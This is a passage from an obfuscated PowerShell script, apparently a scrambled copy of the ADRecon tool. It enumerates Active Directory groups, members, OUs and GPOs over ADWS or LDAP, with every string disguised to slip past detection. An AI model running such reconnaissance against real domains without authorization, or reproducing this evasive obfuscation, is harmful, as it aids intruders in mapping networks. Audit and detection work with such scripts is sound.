            ${adG`Ro`UPs} = @( &("{3}{1}{2}{0}" -f 'p','A','DGrou','Get-') -Filter * -ResultPageSize ${p`AGe`s`IzE} -Properties ("{0}{1}{2}" -f 'A','dmin','Count'),("{0}{2}{1}{4}{3}"-f 'C','non','a','e','icalNam'),("{2}{3}{0}{1}" -f'gui','shedName','Disti','n'),("{1}{0}{2}"-f 'cripti','Des','on'),("{2}{1}{0}"-f 'gory','Cate','Group'),("{1}{3}{2}{0}"-f'e','Gro','pScop','u'),("{1}{4}{2}{0}{3}" -f 'unt','Sa','o','Name','mAcc'),("{1}{0}"-f 'D','SI'),("{1}{2}{0}" -f 'tory','SIDH','is'),("{0}{1}{2}" -f'ma','n','agedBy'),("{3}{4}{2}{1}{0}" -f 'taData','e','alueM','msDS-Re','plV'),("{1}{3}{2}{0}" -f 'ed','w','g','henChan'),("{2}{1}{0}"-f'ted','nCrea','whe') )
        }
        Catch
        {
            &("{2}{0}{1}{3}"-f'rn','in','Write-Wa','g') ("{7}{5}{1}{6}{8}{0}{2}{3}{9}{4}"-f ' while en','ADRGroup]','umera','ting Gro',' Objects','et-',' Erro','[G','r','up')
            &("{1}{3}{2}{0}{4}" -f'o','W','Verb','rite-','se') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`LL}
        }

        If (${aDgR`oU`ps})
        {
            &("{2}{0}{3}{1}" -f 'i','se','Wr','te-Verbo') "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups)) "
            If (${adrgr`o`U`PS})
            {
                ${GR`o`UPoBj} =  (Gi VaRIabLE:9b5p6 ).valuE::("{0}{2}{1}" -f'G','r','roupParse').Invoke(${adGR`o`UpS}, ${T`hr`eAds})
            }
            If (${aDrG`Roup`C`h`AnGeS})
            {
                ${Gr`OupC`hANgES`ObJ} =   ( GeT-VaRIable 9b5P6 -valUE )::("{2}{0}{1}{3}" -f 'upCh','a','Gro','ngeParser').Invoke(${adGR`O`Ups}, ${D`ATe}, ${tH`Rea`dS})
            }
            &("{4}{2}{1}{0}{3}" -f'i','r','emove-Va','able','R') ("{0}{1}"-f 'A','DGroups')
            &("{2}{0}{3}{1}{4}" -f'emo','ariabl','R','ve-V','e') ("{0}{1}" -f 'AD','RGroups')
            &("{2}{4}{1}{0}{3}" -f'r','move-Va','R','iable','e') ("{0}{2}{1}" -f 'ADRGroup','s','Change')
        }
    }

    If (${mE`ThoD} -eq ("{1}{0}" -f'P','LDA'))
    {
        ${o`Bj`seAR`cHer} = &("{2}{0}{3}{1}"-f '-Obj','ct','New','e') ("{10}{5}{1}{0}{9}{7}{2}{8}{4}{6}{3}" -f 'Serv','ory','s.','rcher','e','rect','ctorySea','ce','Dir','i','System.Di') ${Objd`O`MAin}
        ${O`BjSE`ArcHer}."pAG`Es`iZe" = ${Pag`ESI`ze}
        ${OBJS`e`AR`ChEr}."FIl`T`eR" = (("{2}{1}{3}{0}"-f 'up)','ect','(obj','Class=gro'))
        ${objS`Ea`RCH`er}."pRoperT`I`EsTO`LOad".("{1}{0}{2}" -f'ng','AddRa','e').Invoke((("{2}{0}{1}" -f'un','t','adminco'),("{0}{2}{3}{1}" -f 'ca','calname','non','i'), ("{3}{5}{2}{0}{1}{4}" -f'gui','shed','n','dist','name','i'), ("{2}{0}{1}"-f'ript','ion','desc'), ("{2}{0}{1}" -f 'roupt','ype','g'),("{2}{1}{3}{0}"-f 'e','unt','samacco','nam'), ("{0}{2}{1}" -f 's','history','id'), ("{2}{0}{1}"-f 'db','y','manage'), ("{3}{2}{0}{1}{5}{4}"-f 'va','lu','repl','msds-','metadata','e'), ("{1}{0}{2}"-f'jectsi','ob','d'), ("{0}{3}{1}{2}" -f'whencr','ate','d','e'), ("{0}{3}{1}{2}"-f'whencha','g','ed','n')))
        ${obJ`s`earCheR}."SEa`Rc`HscOPe" = ("{2}{0}{1}" -f 'r','ee','Subt')

        Try
        {
            ${adgroU`Ps} = ${Ob`JsEArCH`er}.("{0}{1}"-f 'Fi','ndAll').Invoke()
        }
        Catch
        {
            &("{3}{1}{4}{2}{0}"-f'g','ite-W','in','Wr','arn') ("{3}{2}{7}{0}{6}{1}{8}{9}{4}{5}{10}"-f 'p] Error','h','ADR','[Get-','erating',' Group Object',' w','Grou','il','e enum','s')
            &("{0}{2}{1}" -f 'Wr','Verbose','ite-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }
        ${OBjS`eA`Rc`HeR}.("{2}{1}{0}"-f 'se','o','disp').Invoke()

        If (${a`DGR`Oups})
        {
            &("{1}{3}{2}{0}" -f 'se','W','-Verbo','rite') "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups)) "
            If (${aDR`gR`ouPS})
            {
                ${gr`ouPObj} =  $oLXe::("{1}{3}{0}{2}" -f 'upPars','Gr','er','o').Invoke(${A`dGRO`UPs}, ${t`hReA`ds})
            }
            If (${AdrGroU`pcH`A`NGES})
            {
                ${g`R`OUpcha`NgES`oBJ} =   $oLxE::("{1}{3}{2}{0}"-f'arser','Gr','P','oupChange').Invoke(${aD`groU`ps}, ${da`TE}, ${tHRe`A`ds})
            }
            &("{0}{4}{1}{2}{3}" -f 'Rem','-','Vari','able','ove') ("{1}{2}{0}" -f's','ADGr','oup')
            &("{1}{0}{2}{3}" -f 'move-V','Re','ari','able') ("{1}{0}{2}" -f'R','AD','Groups')
            &("{0}{2}{1}"-f 'Remo','ariable','ve-V') ("{1}{0}{3}{2}{4}"-f'roup','ADRG','ge','Chan','s')
        }
    }

    If (${GRo`U`PObJ})
    {
        &("{2}{1}{0}" -f 'rt-ADR','xpo','E') -ADRObj ${gROUP`obj} -ADROutputDir ${aDR`ou`TPutDIr} -OutputType ${oUt`PU`T`TYpe} -ADRModuleName ("{0}{1}{2}"-f 'G','r','oups')
        &("{1}{2}{0}" -f'able','Remove-','Vari') ("{1}{2}{0}" -f'j','Grou','pOb')
    }

    If (${gROuPC`HAN`GEs`o`Bj})
    {
        &("{2}{1}{3}{0}" -f 'R','ort','Exp','-AD') -ADRObj ${GR`ou`pCHANg`ESOBj} -ADROutputDir ${A`DR`OuTPUtd`iR} -OutputType ${OU`T`PUTTYpE} -ADRModuleName ("{2}{0}{3}{1}" -f 'hang','s','GroupC','e')
        &("{0}{3}{2}{1}" -f'Rem','ariable','V','ove-') ("{3}{0}{2}{4}{1}" -f'o','j','upCha','Gr','ngesOb')
    }
}

Function GET-`A`DR`GRo`UPmEMbEr
{

    param(
        [Parameter(mANdATorY = ${T`RUe})]
        [string] ${me`T`HoD},

        [Parameter(maNdaTORY = ${faL`sE})]
        [DirectoryServices.DirectoryEntry] ${o`BJD`oMAin},

        [Parameter(MANDATOry = ${TR`UE})]
        [int] ${p`AGeS`IzE} = 200,

        [Parameter(mAndAtORy = ${fA`lSe})]
        [int] ${TH`Re`ADS} = 10
    )

    If (${Me`T`hOd} -eq ("{1}{0}" -f'DWS','A'))
    {
        Try
        {
            ${Ad`dOm`AiN} = &("{0}{3}{2}{1}" -f 'Get','in','oma','-ADD')
            ${AddOMai`Ns`iD} = ${ADD`OmAiN}."Do`maIn`siD"."Va`lue"
            &("{2}{3}{0}{1}" -f'ia','ble','Rem','ove-Var') ("{1}{0}{2}" -f 'a','ADDom','in')
        }
        Catch
        {
            &("{1}{0}{2}{3}"-f'e-War','Writ','nin','g') ("{10}{2}{0}{3}{4}{8}{5}{7}{1}{6}{12}{11}{9}"-f't-ADRG','ror ','e','r','oupM','mber] ','getting Domain','Er','e','ext','[G','t',' Con')
            &("{2}{0}{1}" -f'te-V','erbose','Wri') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`LL}
        }

        Try
        {
            ${AdGR`o`UpS} = ${aDg`RO`UPs} = @( &("{2}{0}{1}"-f'-','ADGroup','Get') -Filter * -ResultPageSize ${Pa`GE`Size} -Properties ("{0}{2}{1}"-f'SamAc','ntName','cou'),("{1}{0}" -f 'ID','S') )
        }
        Catch
        {
            &("{4}{0}{1}{2}{3}" -f'rite-','Wa','rni','ng','W') ("{11}{10}{4}{2}{0}{9}{1}{5}{12}{6}{13}{8}{17}{7}{14}{16}{3}{15}" -f ' whi',' e','er] Error','ct','oupMemb','n','m',' Gr','tin','le','RGr','[Get-AD','u','era','oup Ob','s','je','g')
            &("{0}{2}{3}{1}" -f'Write-','e','Ver','bos') "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            ${adGROupM`e`Mb`E`Rs} = @( &("{0}{3}{1}{2}"-f'Get-','bj','ect','ADO') -LDAPFilter ((("{1}{7}{5}{9}{8}{0}{2}{4}{6}{3}" -f 'gr','(D0u(member','o','))','upid=','rim','*','of=*)(p','y','ar')) -CrEplACe  ([CHAR]68+[CHAR]48+[CHAR]117),[CHAR]124) -Properties ("{2}{3}{0}{1}"-f'stinguishe','dName','D','i'),("{0}{1}{2}" -f'Obje','ctClas','s'),("{1}{0}"-f'rof','membe'),("{1}{3}{4}{0}{2}"-f'ryGroup','p','ID','rim','a'),("{3}{0}{2}{1}" -f 'Acc','untName','o','sAM'),("{1}{2}{3}{4}{0}"-f'type','samacc','ou','n','t'), ("{1}{0}{2}" -f'bj','o','ectSid') )
        }
        Catch
        {
            &("{0}{1}{3}{2}" -f'Wr','it','ing','e-Warn') ("{7}{3}{1}{4}{8}{5}{0}{9}{10}{2}{6}" -f'rating','pMember] ','bje','RGrou','Er','me','cts','[Get-AD','ror while enu',' ','GroupMember O')
            &("{1}{3}{2}{0}" -f 'se','Wr','te-Verbo','i') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`ll}
        }

        If ( (${aDdOMA`INs`id}) -and (${AD`g`RO`UpS}) -and (${a`dgRO`U`pM`emBeRS}) )
        {
            &("{0}{3}{2}{1}" -f 'Writ','e','rbos','e-Ve') "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers)) "
            ${gr`oUP`mEM`BeR`ObJ} =  $9B5p6::("{1}{0}{2}{3}"-f 'MemberPar','Group','s','er').Invoke(${ad`GROUps}, ${A`dgROU`pMEMb`e`RS}, ${ADdOmA`I`Ns`ID}, ${tH`REa`Ds})
            &("{0}{2}{3}{1}"-f'Re','able','move','-Vari') ("{1}{0}"-f 'roups','ADG')
            &("{0}{3}{4}{2}{1}"-f'Rem','le','riab','ove-','Va') ("{1}{2}{0}{3}{4}" -f'Me','ADG','roup','m','bers')
            &("{1}{0}{2}{3}" -f'Var','Remove-','ia','ble') ("{3}{0}{1}{2}" -f 'mainS','I','D','ADDo')
        }
    }

    If (${me`Th`od} -eq ("{1}{0}"-f 'AP','LD'))
    {

        If (${c`RE`dEn`TiAl} -ne   $Clf0n::"EM`ptY")
        {
            ${dOM`A`INfqDn} = &("{1}{0}{2}" -f'Nt','Get-D','oFQDN')(${OBJ`dOm`AiN}."DIst`ing`UIShE`D`NAmE")
            ${Do`MainC`on`TexT} = &("{1}{2}{0}"-f'ject','New-O','b') ("{8}{1}{9}{2}{7}{6}{5}{11}{4}{3}{10}{0}{12}{13}" -f'.','m.Direc','ySer','ector','veDir','t','es.Ac','vic','Syste','tor','y','i','Director','yContext')(("{1}{0}"-f'main','Do'),$(${DOmAI`N`FQdn}),$(${Cred`ENt`IaL}."US`eRnA`me"),$(${c`REdE`Nt`IAl}.("{2}{0}{1}{4}{3}{6}{5}"-f 'Netwo','rkC','Get','e','r','l','dentia').Invoke()."p`ASs`wORd"))
            Try
            {
                ${ad`DO`MA`IN} =  $ux5M::("{2}{1}{0}"-f 'tDomain','e','G').Invoke(${d`omAi`NcO`NTEXT})
            }
            Catch
            {
                &("{1}{0}{2}{3}" -f'-Wa','Write','rni','ng') ("{5}{6}{3}{0}{7}{9}{1}{8}{4}{2}"-f ' ','i','t','roupMember]','ontex','[Get','-ADRG','Err','ng Domain C','or gett')
                &("{3}{0}{1}{2}" -f'rbo','s','e','Write-Ve') "[EXCEPTION] $($_.Exception.Message) "
                Return ${NU`LL}
            }
            &("{3}{0}{2}{1}" -f'ov','ariable','e-V','Rem') ("{0}{1}{2}{3}"-f'Dom','a','inCo','ntext')
            Try
            {
                ${fO`RE`sTC`oN`TexT} = &("{2}{1}{0}"-f 'Object','ew-','N') ("{8}{2}{1}{6}{0}{4}{10}{9}{3}{7}{5}" -f'ec','m.Di','ste','iveDirectory.D','torySe','text','r','irectoryCon','Sy','s.Act','rvice')(("{0}{1}" -f 'F','orest'),$(${aDDOm`A`in}."fO`RE`sT"),$(${C`RedenTi`Al}."U`sERnAmE"),$(${CReDE`N`TIAl}.("{1}{2}{3}{4}{0}" -f 'ential','G','etNetwo','r','kCred').Invoke()."Pa`SsWord"))
                ${aD`FO`R`Est} =   $WvlF::("{2}{0}{1}"-f'Fores','t','Get').Invoke(${FOreST`C`O`NTExT})
            }
            Catch
            {
                &("{3}{0}{2}{1}" -f'it','ing','e-Warn','Wr') ("{12}{8}{3}{0}{1}{5}{10}{9}{11}{4}{2}{7}{13}{6}"-f'upMember] ','E','g ','o','in','r','text','Forest ','Gr',' get','ror','t','[Get-ADR','Con')
                &("{0}{2}{3}{1}"-f 'Write','se','-V','erbo') "[EXCEPTION] $($_.Exception.Message) "
            }
            If (${ForEs`T`c`O`NText})
            {
                &("{3}{0}{1}{2}"-f 'ov','e-Varia','ble','Rem') ("{2}{0}{1}"-f 'onte','xt','ForestC')
            }
            If (${a`dF`OresT})
            {
                ${Gl`OBA`LCATAlog} = ${aDfO`Re`st}.("{2}{3}{1}{0}" -f 'og','lCatal','Fi','ndGloba').Invoke()
            }
            If (${G`L`obALca`TaL`oG})
            {
                ${D`N} = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    ${aDobJ`ECT} = &("{2}{3}{0}{1}" -f'b','ject','New','-O') -TypeName ("{4}{2}{10}{6}{0}{1}{7}{8}{5}{3}{9}"-f 'i','ces.Dir','tem','t','Sys','ryEn','toryServ','ect','o','ry','.Direc') -ArgumentList ($(${dn}),$(${Cre`de`NTIAl}."Us`ER`NAME"),$(${cre`D`EntiAl}.("{1}{3}{2}{0}{4}{5}" -f 're','G','etworkC','etN','den','tial').Invoke()."p`A`sSWorD"))
                    ${A`Ddo`mAIns`id} = &("{2}{1}{0}" -f 'ct','je','New-Ob') ("{5}{9}{6}{0}{3}{8}{1}{4}{2}{7}" -f'ity.Pr','ec','tyIdenti','i','uri','Sys','ecur','fier','ncipal.S','tem.S')(${AD`oBJect}."oBje`c`TS`id"[0], 0)
                    ${A`DOBJE`cT}.("{1}{0}{2}"-f 'po','Dis','se').Invoke()
                }
                Catch
                {
                    &("{0}{1}{2}{3}{4}"-f 'W','r','ite','-Warn','ing') "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    &("{1}{0}{2}"-f'-V','Write','erbose') "[EXCEPTION] $($_.Exception.Message) "
                    ${a`dDomA`InS`id} = &("{0}{2}{1}"-f'New-Ob','t','jec') ("{6}{2}{5}{7}{3}{4}{0}{1}" -f'curityIdentifi','er','ystem.Se','y.','Principal.Se','cu','S','rit')(${O`BJd`omAIn}."OBj`eCT`s`iD"[0], 0)
                }
            }
            Else
            {
                ${addo`mAI`Ns`ID} = &("{2}{0}{1}"-f 'w-Obje','ct','Ne') ("{8}{3}{9}{5}{1}{0}{10}{11}{4}{7}{2}{6}" -f'ipa','inc','yIdentifi','yst','ecu','r','er','rit','S','em.Security.P','l.','S')(${ObJD`O`mAIN}."oBJE`CTs`id"[0], 0)
            }
        }
        Else
        {
            ${ADd`OmaIn} =   $Ux5m::("{3}{1}{2}{0}{4}"-f 'Doma','Curre','nt','Get','in').Invoke()
            ${aDf`O`REst} =  $wVlf::("{1}{0}{2}"-f'etCurrentFores','G','t').Invoke()
            Try
            {
                ${g`Lo`BalCa`TA`log} = ${aD`FO`REST}.("{4}{0}{2}{3}{5}{1}" -f 'b','alog','a','lC','FindGlo','at').Invoke()
                ${D`N} = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                ${Adob`J`EcT} = &("{1}{0}{3}{2}"-f 'j','New-Ob','t','ec') -TypeName ("{7}{8}{5}{2}{11}{9}{6}{1}{4}{3}{10}{0}" -f'Entry','ir','m.','ctor','e','te','ces.D','Sy','s','ervi','y','DirectoryS') -ArgumentList (${Dn})
                ${AD`D`omA`inSID} = &("{2}{0}{1}"-f'jec','t','New-Ob') ("{3}{6}{2}{7}{0}{5}{4}{8}{1}{9}{10}"-f 'rity.Principa','ecuri','em.','S','.','l','yst','Secu','S','ty','Identifier')(${A`D`oBjECt}."ObJE`CtSID"[0], 0)
                ${Ad`ObjEct}.("{0}{1}" -f 'dis','pose').Invoke()
            }
            Catch
            {
                &("{1}{0}{2}" -f 'e','Writ','-Warning') "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                &("{2}{0}{1}" -f'r','ite-Verbose','W') "[EXCEPTION] $($_.Exception.Message) "
                ${Ad`do`m`AINsID} = &("{0}{1}{2}" -f'New','-O','bject') ("{7}{12}{8}{4}{5}{6}{3}{0}{1}{2}{9}{10}{11}"-f'rinci','pal','.Sec','.P','ur','i','ty','Sys','em.Sec','urityId','entif','ier','t')(${Ob`Jd`oMAiN}."oB`J`ECtSid"[0], 0)
            }
        }

        ${OB`jseaRcH`Er} = &("{2}{1}{0}" -f 'ect','Obj','New-') ("{1}{5}{7}{6}{3}{8}{11}{4}{2}{9}{10}{0}" -f 'her','Sy','c','ectory','es.Dire','stem','r','.Di','Serv','to','rySearc','ic') ${o`BJ`dom`AiN}
        ${objSeAR`C`HEr}."pa`GE`sIzE" = ${pA`g`esizE}
        ${OBJS`e`ARcH`eR}."F`iltEr" = ("{2}{1}{0}{3}{4}" -f 'ass=','tCl','(objec','group',')')
        ${o`Bj`sEARc`HeR}."prOpeRti`es`To`lO`AD".("{1}{0}"-f'Range','Add').Invoke((("{1}{2}{0}"-f 'e','samaccoun','tnam'), ("{2}{0}{1}"-f 'tsi','d','objec')))
        ${oBjSe`ARC`h`Er}."SeaRC`H`S`COpE" = ("{1}{2}{0}"-f'tree','S','ub')

        Try
        {
            ${AD`GrOU`Ps} = ${o`BjSearcH`ER}.("{1}{0}" -f'indAll','F').Invoke()
        }
        Catch
        {
            &("{1}{0}{2}"-f 'rite-','W','Warning') ("{3}{0}{5}{10}{4}{14}{12}{16}{13}{1}{11}{7}{9}{8}{2}{15}{6}" -f 't-','hi','at','[Ge','] ','ADRGr',' Group Objects',' en','er','um','oupMember','le','r','w','E','ing','ror ')
            &("{1}{2}{3}{0}"-f 'ose','Wri','te','-Verb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`lL}
        }
        ${OBj`Se`A`RchEr}.("{1}{0}" -f 'ispose','d').Invoke()

        ${o`BjSeAR`C`hEr} = &("{2}{1}{0}"-f 't','ec','New-Obj') ("{6}{2}{4}{0}{5}{3}{11}{9}{1}{12}{10}{8}{7}"-f 'ry','i','ec','vice','to','Ser','System.Dir','r','e','D','torySearch','s.','rec') ${obj`Do`mAin}
        ${Obj`SEaRcH`Er}."PaGesi`ze" = ${pAg`esI`zE}
        ${o`B`JSea`RcHER}."f`I`LtEr" = ((("{6}{3}{1}{2}{0}{4}{5}"-f'g','(prima','ry','of=*)','ro','upid=*))','(iDN(member')) -cReplace ([CHAr]105+[CHAr]68+[CHAr]78),[CHAr]124)
        ${ObJsEar`CH`er}."P`R`O`PERTIEsTolOad".("{0}{1}{2}"-f'A','dd','Range').Invoke((("{0}{1}{5}{3}{2}{4}"-f 'di','st','hedn','uis','ame','ing'), ("{0}{2}{1}" -f'd','tname','nshos'), ("{1}{2}{0}"-f 'ass','objectc','l'), ("{4}{0}{3}{1}{2}"-f 'imar','p','id','ygrou','pr'), ("{1}{0}{2}"-f 'ro','membe','f'), ("{0}{3}{1}{2}"-f 'sa','cco','untname','ma'), ("{0}{1}{2}{3}" -f'sama','cc','oun','ttype'), ("{0}{2}{3}{1}"-f'obj','sid','ec','t')))
        ${OBJse`A`RCHEr}."s`earcHsc`opE" = ("{2}{0}{1}" -f't','ree','Sub')

        Try
        {
            ${adGROu`P`meMBE`Rs} = ${OBJsE`ArC`h`eR}.("{2}{0}{1}" -f'ndA','ll','Fi').Invoke()
        }
        Catch
        {
            &("{2}{0}{1}" -f'-Wa','rning','Write') ("{1}{9}{7}{11}{8}{13}{0}{2}{10}{12}{6}{5}{4}{3}"-f 'er','[Get-ADRGroupMember','at','cts','je','ber Ob','Mem','rror','e','] E','ing G',' while ','roup','num')
            &("{1}{0}{3}{2}" -f 'e','Writ','erbose','-V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`Ll}
        }
        ${OB`JSE`Archer}.("{0}{2}{1}" -f'dis','e','pos').Invoke()

        If ( (${addo`Mai`Ns`id}) -and (${A`dGrOu`pS}) -and (${aD`gRO`UP`me`MBeRs}) )
        {
            &("{1}{0}{2}{3}{4}"-f 'r','W','ite-V','e','rbose') "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers)) "
            ${gROU`p`Me`mb`eRoBJ} =  $OlxE::("{1}{0}{2}{3}" -f'Me','Group','mberPar','ser').Invoke(${ADgr`o`UPS}, ${A`DGR`OUPmeM`B`ers}, ${a`ddo`maInSId}, ${TH`ReAdS})
            &("{2}{0}{1}"-f 'l','e','Remove-Variab') ("{1}{0}{2}" -f 'p','ADGrou','s')
            &("{2}{0}{1}{3}" -f'aria','b','Remove-V','le') ("{0}{3}{2}{1}" -f'ADGro','ers','mb','upMe')
            &("{1}{2}{3}{4}{0}"-f'able','R','emov','e-','Vari') ("{2}{1}{0}" -f'inSID','oma','ADD')
        }
    }

    If (${GR`OupmEm`BErO`BJ})
    {
        Return ${GRO`U`pMEm`BeroBJ}
    }
    Else
    {
        Return ${NU`ll}
    }
}

Function Get-A`dr`OU
{

    param(
        [Parameter(maNdaTory = ${T`RUE})]
        [string] ${M`EthOD},

        [Parameter(MaNdatORy = ${Fa`lsE})]
        [DirectoryServices.DirectoryEntry] ${ob`Jd`o`maIN},

        [Parameter(MandatOrY = ${T`RUE})]
        [int] ${pA`Ge`S`izE} = 200,

        [Parameter(MAndAtORy = ${F`Al`Se})]
        [int] ${Thr`ea`dS} = 10
    )

    If (${m`eT`hoD} -eq ("{1}{0}"-f 'WS','AD'))
    {
        Try
        {
            ${aDO`Us} = @( &("{0}{4}{1}{2}{3}" -f'Get-AD','lU','ni','t','Organizationa') -Filter * -Properties ("{4}{1}{2}{3}{5}{0}" -f 'Name','s','tin','guish','Di','ed'),("{2}{1}{0}{3}"-f't','rip','Desc','ion'),("{1}{0}" -f 'ame','N'),("{0}{2}{1}"-f'when','ed','Creat'),("{3}{2}{0}{1}"-f 'hang','ed','henC','w') )
        }
        Catch
        {
            &("{1}{2}{0}" -f 'Warning','Wr','ite-') ("{0}{1}{7}{5}{3}{4}{9}{6}{8}{2}"-f'[G','et','bjects',']',' Error while enumera','DROU','g OU','-A',' O','tin')
            &("{0}{2}{1}" -f'Writ','-Verbose','e') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`lL}
        }

        If (${ad`o`Us})
        {
            &("{1}{2}{0}{3}" -f'Ve','Writ','e-','rbose') "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs)) "
            ${o`Uobj} =  (  ChiLDitEM  ("vaRI"+"a"+"BLe:9"+"b"+"5P6")).VaLue::("{0}{2}{1}"-f'OUPar','er','s').Invoke(${a`dOus}, ${THR`Eads})
            &("{4}{3}{1}{2}{0}"-f'able','-','Vari','move','Re') ("{0}{1}"-f 'ADOU','s')
        }
    }

    If (${m`eTHOd} -eq ("{0}{1}" -f 'LDA','P'))
    {
        ${oB`J`Se`ARcheR} = &("{2}{0}{1}"-f'w-Obj','ect','Ne') ("{6}{3}{4}{2}{5}{7}{8}{1}{0}" -f 'r','Searche','Ser','o','ry','vices.Di','System.Direct','r','ectory') ${oBJD`om`AiN}
        ${oBJS`e`ArC`hEr}."P`AGES`izE" = ${PAG`E`SIZE}
        ${obJ`S`eArCH`eR}."f`ilTer" = (("{6}{7}{5}{2}{1}{0}{3}{4}"-f'na','atio','ganiz','lu','nit)','=or','(o','bjectclass'))
        ${o`Bjsear`ch`Er}."prOPe`Rti`e`S`TOLo`Ad".("{2}{1}{0}" -f 'ge','Ran','Add').Invoke((("{1}{3}{2}{0}"-f 'me','dis','nguishedna','ti'),("{2}{0}{3}{1}"-f'escri','ion','d','pt'),("{0}{1}"-f'na','me'),("{0}{2}{1}{3}"-f 'wh','nc','e','reated'),("{0}{3}{2}{1}"-f 'w','ged','enchan','h')))
        ${ObJ`SE`ArchEr}."SEaRChS`c`OpE" = ("{2}{1}{0}"-f 'tree','ub','S')

        Try
        {
            ${ADo`US} = ${OBjsE`A`RCH`er}.("{2}{1}{0}" -f'll','dA','Fin').Invoke()
        }
        Catch
        {
            &("{1}{0}{2}{3}"-f'W','Write-','ar','ning') ("{6}{3}{1}{2}{5}{0}{4}{7}"-f'ating ','OU] Error ','while enum','-ADR','OU ','er','[Get','Objects')
            &("{2}{1}{0}" -f 'erbose','rite-V','W') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }
        ${o`BJse`Ar`Cher}.("{1}{0}" -f 'ose','disp').Invoke()

        If (${aD`o`US})
        {
            &("{2}{3}{1}{0}" -f'e','rbos','Wr','ite-Ve') "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs)) "
            ${o`UoBJ} =  ( geT-VarIAbLe  olXe  -VAlUEo)::("{0}{1}" -f'OUP','arser').Invoke(${a`DouS}, ${THRe`AdS})
            &("{3}{1}{4}{2}{0}" -f'able','ve-V','ri','Remo','a') ("{1}{0}"-f 'DOUs','A')
        }
    }

    If (${OU`oBJ})
    {
        Return ${o`UobJ}
    }
    Else
    {
        Return ${n`Ull}
    }
}

Function g`Et`-`AdRGPO
{

    param(
        [Parameter(manDatoRY = ${t`RUE})]
        [string] ${Me`T`Hod},

        [Parameter(MANDaToRY = ${Fa`lSE})]
        [DirectoryServices.DirectoryEntry] ${oBj`D`O`mAiN},

        [Parameter(MAnDatOry = ${t`RUE})]
        [int] ${pAg`ESi`zE} = 200,

        [Parameter(MandATOry = ${f`Al`se})]
        [int] ${th`R`eads} = 10
    )

    If (${Met`hOD} -eq ("{1}{0}"-f 'DWS','A'))
    {
        Try
        {
            ${aDG`poS} = @( &("{1}{2}{0}" -f 't','Get-','ADObjec') -LDAPFilter (("{6}{5}{4}{1}{2}{0}{3}"-f'licyCo','grou','pPo','ntainer)','=','ectCategory','(obj')) -Properties ("{2}{1}{0}{3}" -f'playNam','is','D','e'),("{4}{0}{3}{2}{1}" -f'i','e','shedNam','stingui','D'),("{1}{0}" -f 'e','Nam'),("{2}{3}{1}{4}{0}"-f 'Path','il','g','PCF','eSys'),("{1}{0}{2}" -f'enCreate','wh','d'),("{0}{3}{1}{2}"-f 'wh','nge','d','enCha') )
        }
        Catch
        {
            &("{2}{3}{0}{1}" -f '-Warni','ng','Wr','ite') ("{14}{8}{4}{2}{6}{3}{1}{16}{11}{0}{12}{10}{5}{13}{7}{15}{9}"-f 'Con','g gro','le e','tin','rror whi','e','numera','ec','] E','s','in','olicy','ta','r Obj','[Get-ADRGPO','t','upP')
            &("{3}{2}{0}{1}"-f'bos','e','r','Write-Ve') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULL}
        }

        If (${aDg`pOS})
        {
            &("{2}{3}{0}{4}{1}" -f'rb','e','Write-V','e','os') "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs)) "
            ${G`P`osobJ} =  (  get-vARIablE  ('9b5'+'p6')).vaLue::("{2}{1}{0}" -f'er','ars','GPOP').Invoke(${Ad`Gp`oS}, ${T`Hr`eaDs})
            &("{0}{3}{1}{2}{4}" -f'Rem','-V','a','ove','riable') ("{0}{1}{2}"-f'A','DGPO','s')
        }
    }

    If (${M`EtH`OD} -eq ("{1}{0}" -f 'AP','LD'))
    {
        ${oB`J`SeAr`cheR} = &("{2}{0}{1}{3}"-f'Obj','ec','New-','t') ("{7}{1}{9}{4}{3}{10}{0}{6}{5}{2}{8}"-f'to','ct','r','ce','rvi','ySea','r','System.Dire','cher','orySe','s.Direc') ${Ob`JDOM`AIn}
        ${oBj`S`EaR`CHER}."PAGE`S`Ize" = ${PAGeSi`ze}
        ${oBj`SEARCH`eR}."FI`ltEr" = (("{8}{0}{1}{5}{4}{9}{3}{2}{6}{7}"-f 'y','=','nt','o','p','grou','ai','ner)','(objectCategor','PolicyC'))
        ${ObJs`Ea`R`chEr}."SeARChs`cO`PE" = ("{1}{2}{0}" -f'ree','Sub','t')

        Try
        {
            ${aD`GPOS} = ${oB`J`SeaRCHer}.("{0}{1}"-f'F','indAll').Invoke()
        }
        Catch
        {
            &("{2}{3}{0}{1}{4}" -f '-W','arni','Wri','te','ng') ("{12}{6}{11}{18}{1}{14}{10}{7}{16}{8}{2}{4}{3}{17}{5}{0}{9}{15}{13}"-f'ainer Obj',' Erro','ro','p','u','olicyCont','D','while enume','ating g','ec',' ','R','[Get-A','s','r','t','r','P','GPO]')
            &("{1}{2}{0}{3}"-f 'Ver','Writ','e-','bose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`lL}
        }
        ${OBjSe`AR`cHEr}.("{1}{2}{0}" -f'ose','d','isp').Invoke()

        If (${Ad`Gp`os})
        {
            &("{1}{2}{0}"-f'se','W','rite-Verbo') "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs)) "
